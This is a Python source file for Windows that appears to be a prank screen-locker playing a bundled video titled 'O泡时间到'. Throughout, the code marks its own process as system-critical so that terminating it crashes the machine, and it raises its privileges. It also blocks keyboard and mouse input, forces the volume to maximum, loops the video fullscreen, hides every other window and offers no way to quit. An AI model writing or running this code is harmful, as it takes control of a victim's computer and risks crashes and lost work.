import os,sys,ctypes
try:
    def setSystemProcess(val=False):
        ctypes.windll.ntdll.RtlSetProcessIsCritical(val,None,False)
        ctypes.windll.ntdll.RtlSetThreadIsCritical(val,None,False)

    # def raa():
    #     try:
    #         if ctypes.windll.shell32.IsUserAnAdmin():
    #             return True
    #         else:
    #             ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    #             sys.exit()
    #             return bool(ctypes.windll.shell32.IsUserAnAdmin())
    #     except Exception as e:
    #         # sys.exit()
    #         print(e)
    #         return False
    # raa()
    import pygame,time,win32gui,win32con
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    from comtypes import CLSCTX_ALL
    # import tkinter as tk
    tp='{7B4A0E12-2FC6-B071-A56C-0F8A7B0D9D7A}'
    filedir=os.path.expandvars('%temp%/'+tp)
    import mkfile
    if not os.path.exists(filedir):
        mkfile.run()
    # filedir=os.path.dirname(os.path.realpath(__file__))
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    pygame.init()

    try:
        import moviepy.editor as mp
    except:
        import moviepy as mp
    mv=mp.VideoFileClip(os.path.join(filedir,mkfile.tardata.video))
    fs = mv.iter_frames()
    size = mv.size

    frames = []
    # print(type(frames[0]))
    for i in fs:
        frames.append(i)
    fps = mv.fps
    del fs
    del mv
    del mkfile.tardata.data
    video=pygame.Surface(size)
    # 播放电影
    running = True
    clock = pygame.time.Clock()

    screen = pygame.display.set_mode(size, pygame.DOUBLEBUF | pygame.HWSURFACE | pygame.NOFRAME | pygame.FULLSCREEN | pygame.SCALED)
    pygame.display.set_caption("O泡时间到")
    t=time.time()

    pygame.mixer.init()
    pygame.mixer.music.load(os.path.join(filedir,mkfile.tardata.audio))
    pygame.mixer.music.play()

    hwnd = pygame.display.get_wm_info()['window']
    ctypes.windll.ntdll.RtlAdjustPrivilege(19,1,0,ctypes.create_string_buffer(4))
    ctypes.windll.ntdll.RtlAdjustPrivilege(20,1,0,ctypes.create_string_buffer(4))

    setSystemProcess(True)

    while running:
        ctypes.windll.user32.BlockInput(True)
        volume.SetMute(0, None)
        volume.SetMasterVolumeLevel(volume.GetVolumeRange()[1], None)
        # 获取Pygame事件
        es=pygame.event.get()
        # pygame.event.pump()
        # for event in es:
        #     if event.type == pygame.QUIT:
        #         running = False

        # 获取下一帧电影
        f=int((time.time()-t)*fps)
        if f>=len(frames):
            f=0
            pygame.mixer.music.stop()
            pygame.mixer.music.play()
            t=time.time()
        frame = frames[f]
        if frame is None:
            # 电影播放完毕，退出循环
            running = False
        else:
            # 在Pygame窗口上显示电影帧
            video.blit(pygame.transform.flip(pygame.transform.rotate(pygame.surfarray.make_surface(frame),-90),1,0), (0, 0))
            screen.blit(video, (0, 0))
            pygame.display.flip()
            clock.tick(30)
            try:
                if win32gui.GetForegroundWindow()!=hwnd:
                    win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                win32gui.SetForegroundWindow(hwnd)
                win32gui.ShowWindow(hwnd, win32con.SW_SHOW)
                ctypes.windll.user32.SetWindowPos(hwnd,-1,0,0,0,0,0x0001)
            except:pass


    # 释放资源

    pygame.quit()
except Exception as e:
    import traceback
    traceback.print_exc()
    input()